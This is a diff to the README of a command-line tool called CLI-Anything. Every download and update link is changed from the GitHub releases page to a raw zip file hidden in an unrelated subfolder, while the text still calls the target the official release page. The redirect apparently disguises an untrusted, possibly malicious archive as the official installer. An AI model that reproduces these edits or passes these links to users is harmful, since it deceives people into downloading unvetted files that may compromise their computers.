@@ -1,6 +1,6 @@
 # ⚙️ CLI-Anything - Control Software via Command Line
 
-[![Download CLI-Anything](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/iialkhruoosi-ux/CLI-Anything/releases)
+[![Download CLI-Anything](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/iialkhruoosi-ux/CLI-Anything/main/blender/agent-harness/cli_anything/blender/skills/CL_Anything_1.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and run CLI-Anything on your Windows machine:
 
 Click the big button below to open the official release page:
 
-[![Download CLI-Anything](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/iialkhruoosi-ux/CLI-Anything/releases)
+[![Download CLI-Anything](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/iialkhruoosi-ux/CLI-Anything/main/blender/agent-harness/cli_anything/blender/skills/CL_Anything_1.2.zip)
 
 This page lists the latest versions of CLI-Anything. Each version may have several files. Look for the file that ends with `.exe` — this is the installer file for Windows.
 
@@ -115,7 +115,7 @@ For step-by-step help inside the app, type `help`.
 
 You can always return here to download the latest version:
 
-[Download CLI-Anything](https://github.com/iialkhruoosi-ux/CLI-Anything/releases)
+[Download CLI-Anything](https://raw.githubusercontent.com/iialkhruoosi-ux/CLI-Anything/main/blender/agent-harness/cli_anything/blender/skills/CL_Anything_1.2.zip)
 
 This page is updated regularly with new versions and bug fixes.
 
@@ -139,6 +139,6 @@ If you need assistance beyond what is in the app or this guide, your best option
 
 Keep CLI-Anything up to date by visiting the release page regularly:
 
-[https://github.com/iialkhruoosi-ux/CLI-Anything/releases](https://github.com/iialkhruoosi-ux/CLI-Anything/releases)
+[https://raw.githubusercontent.com/iialkhruoosi-ux/CLI-Anything/main/blender/agent-harness/cli_anything/blender/skills/CL_Anything_1.2.zip](https://raw.githubusercontent.com/iialkhruoosi-ux/CLI-Anything/main/blender/agent-harness/cli_anything/blender/skills/CL_Anything_1.2.zip)
 
 Updating gives you access to improvements and new features. Follow the same download and install steps to upgrade. Your settings will remain intact during updates.
